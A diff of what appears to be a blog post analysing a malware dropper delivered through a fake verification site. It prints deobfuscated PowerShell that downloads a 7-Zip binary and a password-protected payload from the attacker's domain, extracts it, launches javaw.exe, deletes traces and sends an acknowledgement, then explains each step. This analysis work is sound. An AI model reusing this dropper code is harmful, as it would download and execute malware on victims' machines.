@@ -1,4 +1,6 @@
-# Dropper Dropper Dropper
+# A Nesting Doll Attack
+
+![Matryoshka Doll](https://raw.githubusercontent.com/Henryisnotavailable/Henryisnotavailable.github.io/refs/heads/main/assets/images/istockphoto-532179108-612x612.jpg)
 
 ---
 I recently received an alert which told me a user had connected to an information stealing website, all I had was **hxxps[:]//svs-verificationdate[.]beer** . **.beer** looks like a legitimate domain.
@@ -242,21 +244,28 @@ for ($i = 0; $i -lt 3 -and !$ok; $i++) {
     catch { Start-Sleep 2 }
 }
 if (![IO.File]::Exists($zipTempfile)) { exit }
-$secondaryTempFile = [IO.Path]::Combine($temporaryDirectory, [IO.Path]::GetRandomFileName())
-[IO.Directory]::CreateDirectory($secondaryTempFile) | Out-Null
+$tempDirectory = [IO.Path]::Combine($temporaryDirectory, [IO.Path]::GetRandomFileName())
+[IO.Directory]::CreateDirectory($tempDirectory) | Out-Null
 $xyArray = @('x', '-y')
 if ($pw) { $xyArray += '-p' + $pw }
-$xyArray += '-o' + $secondaryTempFile
+$xyArray += '-o' + $tempDirectory
 $xyArray += $zipTempfile
-if ([IO.File]::Exists($exeTempfile)) { & $exeTempfile @xyArray | Out-Null }else {
+if ([IO.File]::Exists($exeTempfile)) {
+  & $exeTempfile @xyArray | Out-Null
+}
+
+else {
     try {
         Add-Type -zipTempfile System.IO.Compression.FileSystem
-        [IO.Compression.ZipFile]::ExtractToDirectory($zipTempfile, $secondaryTempFile)
+        [IO.Compression.ZipFile]::ExtractToDirectory($zipTempfile, $tempDirectory)
     }
     catch {}
 }
-$fp = [IO.Directory]::GetFiles($secondaryTempFile, 'javaw.exe', 'AllDirectories') | Select-Object -First 1
-if ($fp) { Start-Process -FilePath $fp }
+$fp = [IO.Directory]::GetFiles($tempDirectory, 'javaw.exe', 'AllDirectories') | Select-Object -First 1
+if ($fp) {
+Start-Process -FilePath $fp
+}
+
 try {
     Start-Sleep 3
     [IO.File]::Delete($zipTempfile)
@@ -267,7 +276,19 @@ $downloadString = 'Downl' + 'oadString'
 try { [void]$wc.$downloadString($ackURL) }catch {}
 ```
 This one performs a similar function, it creates two new temporary files with `.exe` and `.zip` respectively. It then tries 3 times to download a "7zip" file from the domain, and then the malware payload from the domain. The secondary tempfile is created in the temp directory, and then the `$xyArray` is given the value of
-`@('x','-y','-pxmq92ixDm','-oC:\C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0','C:\C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0.zip')`
+`@('x','-y','-pxmq92ixDm','-oC:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0','C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0.zip')`
 
-From there 
+From there it checks if the `$exeTempFile` exists and then runs it using the parameters, which ends up running.
+```
+C:\Users\WDAGUtilityAccount\AppData\Local\Temp\abr22ax.54d.exe x -y
+  -p xmq92ixDm
+  -o C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0
+  C:\Users\WDAGUtilityAccount\AppData\Local\Temp\nau2zssj.em0.zip
+```
+So, the `$exeTempFile` looks like 7z, has commandline flags like 7z, so is probably a version of 7z (which may have been backdoored).
+
+If the file doesn't exist, it reverts to using PowerShell to extract the zipfile to the `$tempDirectory`.
+
+The script then looks in the directory for `javaw.exe`, and tries to run it. It tries sleeping for 3 seconds, then deletes the zip file. After this, it sends an ack to the server.
+
 
